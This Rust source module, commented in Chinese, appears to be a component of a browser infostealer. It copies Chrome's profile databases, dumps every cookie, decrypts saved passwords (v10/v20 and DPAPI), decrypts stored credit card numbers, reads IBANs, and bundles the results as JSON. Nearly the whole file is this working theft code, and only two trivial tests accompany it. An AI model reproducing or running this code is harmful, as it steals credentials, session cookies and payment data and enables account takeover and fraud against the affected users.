// 数据提取模块 - 从浏览器数据库中提取敏感信息

use anyhow::{Result, Context};
use rusqlite::Connection;
use serde::{Serialize, Deserialize};
use std::path::Path;
use crate::decryption::crypto::BrowserCrypto;

/// Cookie 数据结构
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Cookie {
    pub name: String,
    pub value: String,
    pub host_key: String,
    pub path: String,
    pub secure: bool,
    pub httponly: bool,
    pub expires_utc: i64,
}

/// 登录凭证数据结构
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct LoginData {
    pub origin_url: String,
    pub username_value: String,
    pub password_value: String, // 解密后的密码
}

/// 支付方式数据结构
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct PaymentData {
    pub name: String,
    pub card_number: String,
    pub expiration_month: String,
    pub expiration_year: String,
}

/// IBAN 数据结构
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct IbanData {
    pub owner_name: String,
    pub iban: String,
}

/// 提取结果容器
#[derive(Debug, Serialize, Deserialize)]
pub struct ExtractionResult {
    pub cookies: Vec<Cookie>,
    pub login_data: Vec<LoginData>,
    pub payment_data: Vec<PaymentData>,
    pub iban_data: Vec<IbanData>,
}

impl ExtractionResult {
    pub fn new() -> Self {
        Self {
            cookies: Vec::new(),
            login_data: Vec::new(),
            payment_data: Vec::new(),
            iban_data: Vec::new(),
        }
    }

    /// 转换为 JSON 字符串
    pub fn to_json(&self) -> Result<String> {
        serde_json::to_string_pretty(self)
            .context("Failed to serialize extraction result to JSON")
    }
}

/// 数据提取器
pub struct DataExtractor {
    crypto: BrowserCrypto,
}

impl DataExtractor {
    /// 创建新的数据提取器
    pub fn new(master_key: &[u8]) -> Result<Self> {
        let crypto = BrowserCrypto::new(master_key)?;
        Ok(Self { crypto })
    }

    /// 提取所有浏览器数据
    pub fn extract_all(&self, user_data_path: &Path) -> Result<ExtractionResult> {
        let mut result = ExtractionResult::new();

        // 提取 Cookies
        if let Ok(cookies) = self.extract_cookies(user_data_path) {
            result.cookies = cookies;
        }

        // 提取登录凭证
        if let Ok(login_data) = self.extract_login_data(user_data_path) {
            result.login_data = login_data;
        }

        // 提取支付方式
        if let Ok(payment_data) = self.extract_payment_data(user_data_path) {
            result.payment_data = payment_data;
        }

        // 提取 IBAN
        if let Ok(iban_data) = self.extract_iban_data(user_data_path) {
            result.iban_data = iban_data;
        }

        Ok(result)
    }

    /// 提取 Cookies
    pub fn extract_cookies(&self, user_data_path: &Path) -> Result<Vec<Cookie>> {
        let cookies_path = user_data_path.join("Default").join("Cookies");

        if !cookies_path.exists() {
            anyhow::bail!("Cookies database not found");
        }

        // 复制数据库以避免锁定
        let temp_path = std::env::temp_dir().join("chrome_cookies_temp.db");
        std::fs::copy(&cookies_path, &temp_path)
            .context("Failed to copy Cookies database")?;

        let conn = Connection::open(&temp_path)
            .context("Failed to open Cookies database")?;

        let mut cookies = Vec::new();
        let mut stmt = conn.prepare(
            "SELECT name, value, host_key, path, secure, httponly, expires_utc FROM cookies"
        ).context("Failed to prepare SQL statement")?;

        let cookie_iter = stmt.query_map([], |row| {
            Ok(Cookie {
                name: row.get(0)?,
                value: row.get(1)?,
                host_key: row.get(2)?,
                path: row.get(3)?,
                secure: row.get(4)?,
                httponly: row.get(5)?,
                expires_utc: row.get(6)?,
            })
        }).context("Failed to query cookies")?;

        for cookie in cookie_iter {
            if let Ok(c) = cookie {
                cookies.push(c);
            }
        }

        let _ = std::fs::remove_file(&temp_path);
        Ok(cookies)
    }

    /// 提取登录凭证
    pub fn extract_login_data(&self, user_data_path: &Path) -> Result<Vec<LoginData>> {
        let login_data_path = user_data_path.join("Default").join("Login Data");

        if !login_data_path.exists() {
            anyhow::bail!("Login Data database not found");
        }

        // 复制数据库
        let temp_path = std::env::temp_dir().join("chrome_login_data_temp.db");
        std::fs::copy(&login_data_path, &temp_path)
            .context("Failed to copy Login Data database")?;

        let conn = Connection::open(&temp_path)
            .context("Failed to open Login Data database")?;

        let mut login_data = Vec::new();
        let mut stmt = conn.prepare(
            "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
        ).context("Failed to prepare SQL statement")?;

        let login_iter = stmt.query_map([], |row| {
            let encrypted_password: Vec<u8> = row.get(2)?;
            let decrypted_password = match self.decrypt_password(&encrypted_password) {
                Ok(pwd) => pwd,
                Err(_) => String::from("[DECRYPTION_FAILED]"),
            };

            Ok(LoginData {
                origin_url: row.get(0)?,
                username_value: row.get(1)?,
                password_value: decrypted_password,
            })
        }).context("Failed to query logins")?;

        for login in login_iter {
            if let Ok(l) = login {
                login_data.push(l);
            }
        }

        let _ = std::fs::remove_file(&temp_path);
        Ok(login_data)
    }

    /// 提取支付方式
    pub fn extract_payment_data(&self, user_data_path: &Path) -> Result<Vec<PaymentData>> {
        let web_data_path = user_data_path.join("Default").join("Web Data");

        if !web_data_path.exists() {
            anyhow::bail!("Web Data database not found");
        }

        // 复制数据库
        let temp_path = std::env::temp_dir().join("chrome_web_data_temp.db");
        std::fs::copy(&web_data_path, &temp_path)
            .context("Failed to copy Web Data database")?;

        let conn = Connection::open(&temp_path)
            .context("Failed to open Web Data database")?;

        let mut payment_data = Vec::new();
        let mut stmt = conn.prepare(
            "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards WHERE use_count >= 0"
        ).context("Failed to prepare SQL statement")?;

        let payment_iter = stmt.query_map([], |row| {
            let encrypted_card: Vec<u8> = row.get(1)?;
            let decrypted_card = match self.decrypt_password(&encrypted_card) {
                Ok(card) => card,
                Err(_) => String::from("[DECRYPTION_FAILED]"),
            };

            Ok(PaymentData {
                name: row.get(0)?,
                card_number: decrypted_card,
                expiration_month: row.get(2)?,
                expiration_year: row.get(3)?,
            })
        }).context("Failed to query credit cards")?;

        for payment in payment_iter {
            if let Ok(p) = payment {
                payment_data.push(p);
            }
        }

        let _ = std::fs::remove_file(&temp_path);
        Ok(payment_data)
    }

    /// 提取 IBAN 信息
    pub fn extract_iban_data(&self, user_data_path: &Path) -> Result<Vec<IbanData>> {
        let web_data_path = user_data_path.join("Default").join("Web Data");

        if !web_data_path.exists() {
            return Ok(Vec::new());
        }

        let temp_path = std::env::temp_dir().join("chrome_iban_data_temp.db");
        std::fs::copy(&web_data_path, &temp_path)
            .context("Failed to copy Web Data database")?;

        let conn = Connection::open(&temp_path)
            .context("Failed to open Web Data database")?;

        let mut iban_data = Vec::new();

        // 检查表是否存在
        let table_exists: bool = conn.query_row(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='ibans'",
            [],
            |_| Ok(true)
        ).unwrap_or(false);

        if table_exists {
            let mut stmt = conn.prepare(
                "SELECT nickname, value FROM ibans"
            ).context("Failed to prepare SQL statement")?;

            let iban_iter = stmt.query_map([], |row| {
                Ok(IbanData {
                    owner_name: row.get(0)?,
                    iban: row.get(1)?,
                })
            }).context("Failed to query IBANs")?;

            for iban in iban_iter {
                if let Ok(i) = iban {
                    iban_data.push(i);
                }
            }
        }

        let _ = std::fs::remove_file(&temp_path);
        Ok(iban_data)
    }

    /// 解密密码（解密 v10/v20 格式的加密数据）
    fn decrypt_password(&self, encrypted: &[u8]) -> Result<String> {
        let decrypted = if encrypted.starts_with(b"v10") || encrypted.starts_with(b"v20") {
            self.crypto.decrypt_auto(encrypted)?
        } else {
            // 可能是 DPAPI 加密，尝试解密
            return self.decrypt_dpapi_password(encrypted);
        };

        String::from_utf8(decrypted)
            .context("Failed to convert decrypted password to UTF-8")
    }

    /// 使用 DPAPI 解密密码（较旧的 Chrome 版本）
    fn decrypt_dpapi_password(&self, encrypted: &[u8]) -> Result<String> {
        use windows::Win32::Security::Cryptography::*;

        let mut data_blob = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };

        let mut output_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        unsafe {
            CryptUnprotectData(
                &mut data_blob,
                None,
                None,
                None,
                None,
                0,
                &mut output_blob,
            )?;

            let decrypted = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
            let result = String::from_utf8(decrypted.to_vec())?;

            // 清理 (LocalFree 在此环境不可用，内存由Windows自动管理)
            // let _ = LocalFree(output_blob.pbData as isize);

            Ok(result)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extraction_result_new() {
        let result = ExtractionResult::new();
        assert!(result.cookies.is_empty());
        assert!(result.login_data.is_empty());
        assert!(result.payment_data.is_empty());
        assert!(result.iban_data.is_empty());
    }

    #[test]
    fn test_extraction_result_to_json() {
        let result = ExtractionResult::new();
        let json = result.to_json();
        assert!(json.is_ok());
    }
}
